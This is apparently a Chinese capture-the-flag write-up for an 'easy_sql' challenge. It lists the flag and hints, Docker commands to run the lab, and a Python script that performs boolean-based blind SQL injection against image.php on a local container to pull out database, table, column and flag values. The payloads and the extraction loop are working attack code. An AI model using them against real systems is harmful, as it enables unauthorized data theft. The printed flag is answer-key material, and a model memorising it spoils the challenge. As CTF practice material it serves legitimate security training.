# 题目：easy_sql

### 题目描述：嘉然，为了你我要打ctf！！！咦？这里这么注入不进去呢？奇怪

### 题目难度： 中下

### flag: `flag{Gu@ng2hU_j1arAn_Dundun_ji3Chan9}`

### 提示：

1.登录功能不是注入点

2.jpg文件头JFIF

### 配置信息： 

```bash
docker build -t easy_sql/hsctfxb2021 -f Dockerfile .
docker run -it -d -p 23180:80 easy_sql/hsctfxb2021
```

### 解题过程：

```python
import requests
#python3
url = "http://localhost:23180/image.php?"
#数据库名
payload = "id=0%27%20or%20(ascii(substr(database(),{},1)))>{}%23"
#表名
payload1 = "id=0%27%20or%20(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)=database()),{},1)))>{}%23"
#字段名
payload2 = "id=0%27%20or%20(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=%27users%27)),{},1)))>{}%23"
#flag内容
payload3 = "id=0%27%20or%20(ascii(substr((select flag from users),{},1)))>{}%23"
result = ""
for i in range(1,50):
    l = 31
    r = 128
    mid = (l + r)>>1
    while(l<r):
        payloads = payload3.format(i,mid)
        html = requests.get(url+payloads)
        if "JFIF" in html.text:
            l = mid +1
        else:
            r = mid
        mid = (l + r)>>1
    result+=chr(mid)
    print(result)


```

